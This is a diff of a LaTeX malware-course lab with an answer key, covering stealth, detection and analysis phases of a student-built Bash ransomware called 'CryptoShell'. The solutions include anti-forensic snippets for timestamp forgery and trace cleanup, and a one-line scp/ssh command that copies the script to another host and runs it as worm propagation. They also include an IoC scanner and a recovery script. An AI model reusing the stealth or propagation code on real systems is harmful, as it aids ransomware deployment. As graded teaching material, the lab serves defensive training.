+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\subsection*{Phase 5 --- Stealth and Anti-detection \hfill \normalsize [3 points]}
+
+\begin{rappel}
+\textbf{Stealth Techniques:}
+
+A stealthy malware seeks to conceal traces of its activity to delay detection:
+\begin{itemize}
+    \item \textbf{Timestamp preservation:} modifying a file changes its last modification date (\texttt{mtime}). An administrator monitoring dates can detect an anomaly.
+    \item \textbf{Temporary file cleanup:} any artifact left by the malware (temporary files, logs) is evidence.
+    \item \textbf{Error suppression:} error messages on \texttt{stderr} can alert the user.
+\end{itemize}
+
+\medskip
+\textbf{Key commands:}
+\begin{itemize}
+    \item \texttt{touch -r reference file}: apply timestamps from \texttt{reference} to \texttt{file}
+    \item \texttt{stat --format="\%y" file}: display modification date
+    \item \texttt{trap "commands" EXIT SIGINT SIGTERM}: execute \texttt{commands} on script exit (even on Ctrl+C or kill)
+    \item \texttt{2>/dev/null}: redirect \texttt{stderr} to \texttt{/dev/null}
+\end{itemize}
+\end{rappel}
+
+\begin{enumerate}
+\item[\textbf{5a)}] Add \textbf{timestamp preservation}: before encrypting each file, save its modification date, then restore it on the \texttt{.locked} file. Use \texttt{touch -r} to copy timestamps.
+
+\item[\textbf{5b)}] Add a \textbf{cleanup mechanism}: use \texttt{trap} to guarantee deletion of all temporary files (key, intermediate files) even on interruption (SIGINT, SIGTERM). Redirect stderr with \texttt{2>/dev/null} on critical commands.
+
+\item[\textbf{5c)}] \textbf{Theoretical question:} Line-reordering polymorphism (from Lab 04) and XOR encryption polymorphism (from Lab 02) aim for the same goal: evading signature-based detection. Compare these two approaches: which is more robust? Which leaves a detectable invariant? Could an antivirus detect CryptoShell despite these techniques?
+\end{enumerate}
+
+\begin{correction}
+
+\textbf{5a)} Timestamp preservation --- code to add in the encryption loop:
+\begin{lstlisting}[title=Timestamp preservation (5a)]
+# Before encryption: save timestamp
+touch -r "$filepath" "/tmp/.cs_ref_$$" 2>/dev/null
+# ... (xor_file encryption + rm) ...
+# After encryption: restore timestamp
+touch -r "/tmp/.cs_ref_$$" "${filepath}.locked" 2>/dev/null
+rm -f "/tmp/.cs_ref_$$" 2>/dev/null
+\end{lstlisting}
+
+\textbf{5b)} Cleanup with trap --- code to add at the beginning of the script:
+\begin{lstlisting}[title=Cleanup with trap (5b)]
+# Guaranteed cleanup even on Ctrl+C
+trap "rm -f /tmp/.cs_ref_$$ .cryptoshell_key.tmp .cs_count 2>/dev/null" EXIT SIGINT SIGTERM
+\end{lstlisting}
+
+The complete script integrating all phases (1--5) is provided in \texttt{corriges/phase5\_stealth.sh}.
+
+\medskip
+\textbf{5c)} Comparison of the two polymorphism types:
+
+\begin{center}
+\begin{tabular}{lp{5cm}p{5cm}}
+\toprule
+\textbf{Criterion} & \textbf{XOR Polymorphism} & \textbf{Reordering Polymorphism} \\
+\midrule
+\textbf{Principle} & Code is encrypted with a different key for each copy & Code lines are randomly permuted \\
+\textbf{Invariant} & The \textbf{decryption routine} (decryptor) remains in cleartext & The \textbf{restoration code} (which reorders lines) remains fixed \\
+\textbf{Robustness} & High --- encrypted code looks like noise & Medium --- individual lines are readable \\
+\textbf{Detection} & Decryptor signature & Restoration code signature + \texttt{\#@n\#} tags \\
+\bottomrule
+\end{tabular}
+\end{center}
+
+\textbf{Both} leave a detectable invariant: the code that reorders/decrypts. XOR polymorphism is more robust because encrypted code looks like random noise, while permuted lines remain individually readable.
+
+For CryptoShell: an antivirus could detect \textbf{behavioral patterns} (massive file encryption, ransom note creation, \texttt{.locked} files) even without a static signature. This is the principle behind modern \textbf{EDR} (\textit{Endpoint Detection and Response}) systems.
+
+\begin{pointcle}
+\begin{itemize}
+    \item Stealth does not make detection impossible, but \textbf{delays discovery}. In a real ransomware, the time between infection and detection is critical: the longer it takes, the more files are encrypted.
+    \item \textbf{Behavioral detection} (monitoring mass file access patterns + encryption) is the most robust as it detects the malware's \textbf{intent} rather than its \textbf{form}.
+    \item \texttt{trap ... EXIT SIGINT SIGTERM} is a universal Bash best practice --- it guarantees cleanup even on interruption.
+\end{itemize}
+\end{pointcle}
+
+\end{correction}
+
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%% PHASE 6: Detection and Recovery
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\subsection*{Phase 6 --- Detection and Recovery \hfill \normalsize [4 points]}
+
+\begin{rappel}
+\textbf{Indicators of Compromise (IoC) and Detection Types:}
+
+An \textbf{Indicator of Compromise} (IoC) is an observable artifact that signals an infection or intrusion.
+
+\medskip
+\textbf{Antivirus detection types:}
+\begin{itemize}
+    \item \textbf{Signature-based} (\textit{pattern matching}): search for known strings or patterns in files (fast, precise, but bypassed by polymorphism)
+    \item \textbf{Heuristic}: analysis of suspicious code without known signature --- detection of behavioral patterns in source code (e.g., a script that massively encrypts files)
+    \item \textbf{Behavioral}: monitoring actions \textbf{at runtime} --- detecting the program's intent (e.g., mass file access + writing encrypted files)
+\end{itemize}
+
+\medskip
+\textbf{Useful \texttt{grep} commands for analysis:}
+\begin{itemize}
+    \item \texttt{grep -q "pattern" file}: silent mode, exit code 0 if found
+    \item \texttt{grep -r "pattern" directory}: recursive search
+    \item \texttt{grep -l "pattern" *.sh}: list files containing the pattern
+    \item \texttt{grep -c "pattern" file}: count occurrences
+\end{itemize}
+\end{rappel}
+
+\begin{enumerate}
+\item[\textbf{6a)}] Write \texttt{scanner.sh} that traverses a directory and detects CryptoShell \textbf{Indicators of Compromise (IoC)}:
+\begin{itemize}
+    \item Presence of \texttt{.locked} files
+    \item Presence of \texttt{RANSOM\_NOTE.txt}
+    \item Presence of hidden files \texttt{.cs\_count}, \texttt{.cryptoshell\_key}
+    \item Suspicious patterns in scripts: \texttt{xor}, \texttt{locked}, \texttt{RANSOM}
+\end{itemize}
+The scanner must display a summary report with the number of IoCs found per category.
+
+\item[\textbf{6b)}] Write \texttt{recovery.sh} that: (1) searches for the \texttt{.cryptoshell\_key} file, (2) if found, decrypts all \texttt{.locked} files in the directory, (3) deletes ransom notes and state files.
+
+\item[\textbf{6c)}] \textbf{Theoretical question:} Fill in an IoC table for each phase (1--5) with: the technique used, the detectable IoC, the detection type (signature, heuristic, behavioral). Propose a detection strategy combining all 3 approaches.
+\end{enumerate}
+
+\begin{correction}
+
+\textbf{6a)} Detection scanner:
+\begin{lstlisting}[title=scanner.sh (phase6\_scanner.sh)]
+#!/bin/bash
+# CryptoShell IoC Scanner
+DIR="${1:-.}"
+echo "=== CryptoShell IoC Scanner ==="
+echo "Directory: $DIR"
+echo ""
+IOC_LOCKED=0; IOC_RANSOM=0; IOC_HIDDEN=0; IOC_PATTERNS=0
+
+echo "--- Encrypted files (.locked) ---"
+while IFS= read -r f; do
+    echo "  [LOCKED] $f"
+    IOC_LOCKED=$((IOC_LOCKED + 1))
+done < <(find "$DIR" -name "*.locked" -type f 2>/dev/null)
+[ "$IOC_LOCKED" -eq 0 ] && echo "  None."
+
+echo "--- Ransom notes ---"
+while IFS= read -r f; do
+    echo "  [RANSOM] $f"
+    IOC_RANSOM=$((IOC_RANSOM + 1))
+done < <(find "$DIR" -name "RANSOM_NOTE.txt" -type f 2>/dev/null)
+[ "$IOC_RANSOM" -eq 0 ] && echo "  None."
+
+echo "--- Suspicious hidden files ---"
+for name in ".cs_count" ".cryptoshell_key"; do
+    while IFS= read -r f; do
+        echo "  [HIDDEN] $f"
+        IOC_HIDDEN=$((IOC_HIDDEN + 1))
+    done < <(find "$DIR" -name "$name" -type f 2>/dev/null)
+done
+[ "$IOC_HIDDEN" -eq 0 ] && echo "  None."
+
+echo "--- Suspicious patterns (scripts) ---"
+while IFS= read -r f; do
+    IND=""
+    grep -q "xor" "$f" 2>/dev/null && IND="$IND [xor]"
+    grep -q "locked" "$f" 2>/dev/null && IND="$IND [locked]"
+    grep -q "RANSOM" "$f" 2>/dev/null && IND="$IND [RANSOM]"
+    if [ -n "$IND" ]; then
+        echo "  [SUSPECT] $(basename "$f"):$IND"
+        IOC_PATTERNS=$((IOC_PATTERNS + 1))
+    fi
+done < <(find "$DIR" -name "*.sh" -type f 2>/dev/null)
+[ "$IOC_PATTERNS" -eq 0 ] && echo "  None."
+
+echo ""
+echo "=== REPORT ==="
+TOTAL=$((IOC_LOCKED + IOC_RANSOM + IOC_HIDDEN + IOC_PATTERNS))
+echo "  .locked files      : $IOC_LOCKED"
+echo "  Ransom notes       : $IOC_RANSOM"
+echo "  Hidden files       : $IOC_HIDDEN"
+echo "  Suspicious scripts : $IOC_PATTERNS"
+echo "  TOTAL IoC          : $TOTAL"
+\end{lstlisting}
+
+\textbf{6b)} Recovery tool:
+\begin{lstlisting}[title=recovery.sh (phase6\_recovery.sh)]
+#!/bin/bash
+# CryptoShell Recovery Tool
+source xor_helper.sh
+DIR="${1:-.}"
+echo "=== CryptoShell Recovery ==="
+
+KEY_FILE=$(find "$DIR" -name ".cryptoshell_key" -type f 2>/dev/null | head -n 1)
+[ -z "$KEY_FILE" ] && [ -f ".cryptoshell_key" ] && KEY_FILE=".cryptoshell_key"
+if [ -z "$KEY_FILE" ]; then
+    echo "[!] Key not found. Decryption impossible."
+    exit 1
+fi
+KEY=$(cat "$KEY_FILE")
+echo "[+] Key found: $KEY"
+
+RECOVERED=0
+while IFS= read -r locked; do
+    original="${locked%.locked}"
+    xor_file "$locked" "$original" "$KEY"
+    rm -f "$locked"
+    echo "  [+] $(basename "$locked") -> $(basename "$original")"
+    RECOVERED=$((RECOVERED + 1))
+done < <(find "$DIR" -name "*.locked" -type f 2>/dev/null)
+
+for name in "RANSOM_NOTE.txt" ".cryptoshell_key" ".cs_count"; do
+    find "$DIR" -name "$name" -type f -delete 2>/dev/null
+done
+[ -f ".cryptoshell_key" ] && rm -f ".cryptoshell_key"
+[ -f ".cs_count" ] && rm -f ".cs_count"
+
+echo "[OK] $RECOVERED files recovered."
+\end{lstlisting}
+
+\textbf{6c)} IoC table by phase:
+
+\begin{center}
+\begin{tabular}{clp{4cm}l}
+\toprule
+\textbf{Phase} & \textbf{Technique} & \textbf{Detectable IoC} & \textbf{Detection type} \\
+\midrule
+1 & Recursive search & Mass access to \texttt{.txt}/\texttt{.dat} files & Behavioral \\
+2 & XOR encryption & \texttt{.locked} files, \texttt{.cryptoshell\_key} & Signature \\
+3 & Propagation + ransom & \texttt{RANSOM\_NOTE.txt}, \texttt{xor}/\texttt{locked} patterns & Signature + Heuristic \\
+4 & Trigger & \texttt{.cs\_count}, \texttt{date} conditions & Heuristic \\
+5 & Stealth & \texttt{touch -r}, \texttt{trap}, \texttt{2>/dev/null} & Heuristic \\
+\bottomrule
+\end{tabular}
+\end{center}
+
+\textbf{Combined detection strategy:}
+\begin{enumerate}
+    \item \textbf{Signature:} Search for known IoCs (\texttt{.locked} files, \texttt{RANSOM\_NOTE.txt}, \texttt{.cryptoshell\_key}).
+    \item \textbf{Heuristic:} Analyze scripts for suspicious patterns (use of \texttt{xor}, file loops, encryption).
+    \item \textbf{Behavioral:} Monitor file accesses in real time --- detect a process that massively reads data files then rewrites them (encryption pattern).
+\end{enumerate}
+
+Combining all 3 approaches minimizes \textbf{false negatives} (malware that escapes signature detection can be caught by heuristics or behavior) and \textbf{false positives} (a legitimate script containing ``xor'' won't be flagged if its behavior is normal).
+
+\begin{pointcle}
+\begin{itemize}
+    \item \textbf{Behavioral detection} (monitoring mass file access patterns + encryption) is the most robust as it detects the malware's \textbf{intent} rather than its \textbf{form}. This is the principle behind modern EDR (\textit{Endpoint Detection and Response}) systems.
+    \item A good scanner combines \textbf{multiple IoC types} to reduce false positives and false negatives.
+    \item The recovery tool only works if the key is present locally. In a real ransomware, the key is exfiltrated to a remote server.
+\end{itemize}
+\end{pointcle}
+
+\end{correction}
+
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%% PHASE 7: Analysis Report
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\subsection*{Phase 7 --- Analysis Report \hfill \normalsize [4 points]}
+
+\noindent A report template (\texttt{rapport\_template.tex}) is provided. Fill in the following sections:
+
+\begin{enumerate}
+\item[\textbf{R1)}] \textbf{Adleman's Classification:} Where does CryptoShell fit in the classification? Simple or self-reproducing program? Justify.
+
+\item[\textbf{R2)}] \textbf{Life Cycle:} Draw (in ASCII art or diagram) the complete life cycle of CryptoShell, identifying the 3 classic phases (infection, incubation, disease). Indicate which lab phase corresponds to each step.
+
+\item[\textbf{R3)}] \textbf{Virus, Worm, or Trojan:} Is CryptoShell as implemented a virus, worm, or Trojan horse? How would you modify it to become a worm (network propagation)? How would you transform it into a Trojan?
+
+\item[\textbf{R4)}] \textbf{Comparison with Document Viruses:} A Word macro-virus and CryptoShell both target data files. What are the fundamental similarities and differences (infection vector, target format, interpreter, persistence)?
+
+\item[\textbf{R5)}] \textbf{IoC Table by Phase:} Fill in a complete table [Phase $|$ Technique $|$ IoC $|$ Detection type].
+
+\item[\textbf{R6)}] \textbf{Ethical Reflection:} How is the study of malware construction in an academic setting beneficial for cybersecurity? Cite at least one concrete example.
+\end{enumerate}
+
+\medskip
+\noindent\textit{The report is graded on the quality of analysis, not length.}
+
+\begin{correction}
+
+\textbf{R1) Adleman's Classification:}
+
+CryptoShell is a \textbf{simple program} (non-self-reproducing) in Adleman's classification. It does not copy itself into other programs: it encrypts the victim's files and demands a ransom, but does not propagate on its own.
+
+However, CryptoShell could be \textbf{coupled} with a propagation vector:
+\begin{itemize}
+    \item Coupled with a \textbf{virus}: integrated into viral code, it would activate at each infection
+    \item Coupled with a \textbf{worm}: automatic network propagation (like WannaCry = EternalBlue + ransomware)
+\end{itemize}
+
+\medskip
+\textbf{R2) Life Cycle:}
+\begin{lstlisting}[numbers=none,frame=none,backgroundcolor=\color{white},language={}]
++--------------------------------------------------+
+|           CRYPTOSHELL LIFE CYCLE                  |
++--------------------------------------------------+
+|                                                   |
+|  [Phase 1: Reconnaissance]                        |
+|       |                                           |
+|       v                                           |
+|  INFECTION: Script is deployed on the system      |
+|  (via phishing, USB drive, exploit...)            |
+|  -> Phase 1 (recon) + Phase 3 (propagation)       |
+|       |                                           |
+|       v                                           |
+|  INCUBATION: Trigger waits for its condition      |
+|  (counter < 5 or not Sunday)                      |
+|  -> Phase 4 (trigger) + Phase 5 (stealth)         |
+|       |                                           |
+|       v                                           |
+|  DISEASE: Encryption activates                    |
+|  -> Phase 2 (XOR) + Phase 3 (ransom note)         |
+|       |                                           |
+|       v                                           |
+|  [Ransom demand displayed]                        |
++--------------------------------------------------+
+\end{lstlisting}
+
+\medskip
+\textbf{R3) Virus, Worm, or Trojan:}
+
+CryptoShell as implemented is \textbf{neither a virus nor a worm}:
+\begin{itemize}
+    \item It is \textbf{not a virus} because it does not copy itself into other executable programs.
+    \item It is \textbf{not a worm} because it does not propagate via the network.
+    \item It is a \textbf{simple malicious program} (ransomware). It could be classified as a \textbf{Trojan horse} if disguised as a legitimate program (e.g., embedded in \texttt{setup\_lab.sh}).
+\end{itemize}
+
+\textbf{To transform into a worm:} Add a network propagation module (port scanner, SSH vulnerability exploitation, email spreading). Example: \texttt{scp cryptoshell.sh user@\$IP:/tmp/ \&\& ssh user@\$IP bash /tmp/cryptoshell.sh}.
+
+\textbf{To transform into a Trojan:} Embed it in a legitimate-looking program (an installer, a game, a utility). The user runs the ``normal'' program and CryptoShell activates in the background.
+
+\medskip
+\textbf{R4) Comparison with Document Viruses:}
+
+\begin{center}
+\begin{tabular}{lp{4.5cm}p{4.5cm}}
+\toprule
+\textbf{Criterion} & \textbf{Word Macro-virus} & \textbf{CryptoShell} \\
+\midrule
+\textbf{Vector} & VBA macros in the document & Independent Bash script \\
+\textbf{Target format} & \texttt{.doc}/\texttt{.docx} files & \texttt{.txt}/\texttt{.dat} files \\
+\textbf{Interpreter} & Microsoft Word (VBA engine) & Bash (Linux shell) \\
+\textbf{Persistence} & Integrates into Normal.dot template & \texttt{.locked} files + hidden key \\
+\textbf{Self-reproduction} & Yes (infects Normal.dot $\to$ all documents) & No (no propagation) \\
+\textbf{Action} & Propagates, may have a payload & Encrypts data \\
+\bottomrule
+\end{tabular}
+\end{center}
+
+\textbf{Main similarity:} Both target \textbf{data} files (not executables).
+
+\textbf{Fundamental difference:} The macro-virus is \textbf{self-reproducing} (it infects the global template then all opened documents), while CryptoShell is a \textbf{simple program} that does not reproduce.
+
+\medskip
+\textbf{R5)} See Phase 6c table (identical).
+
+\medskip
+\textbf{R6) Ethical Reflection:}
+
+Studying malware construction in an academic setting is beneficial because:
+\begin{itemize}
+    \item \textbf{Understanding attacks to build defenses:} One cannot effectively detect a ransomware without understanding its inner workings (search routine, encryption, stealth).
+    \item \textbf{Training future defenders:} Cybersecurity analysts must be able to reverse-engineer malware to develop IoCs and detection rules.
+    \item \textbf{Concrete example:} The analysis of the \textbf{WannaCry} ransomware (2017) by researcher Marcus Hutchins led to the discovery of a ``kill switch'' (an unregistered domain checked by the malware). By registering this domain, Hutchins stopped the worldwide propagation of the ransomware, saving millions of systems. This discovery was only possible thanks to a deep understanding of the malicious code.
+\end{itemize}
+
+\end{correction}
+
+
+\end{exercice}
+
+\end{document}
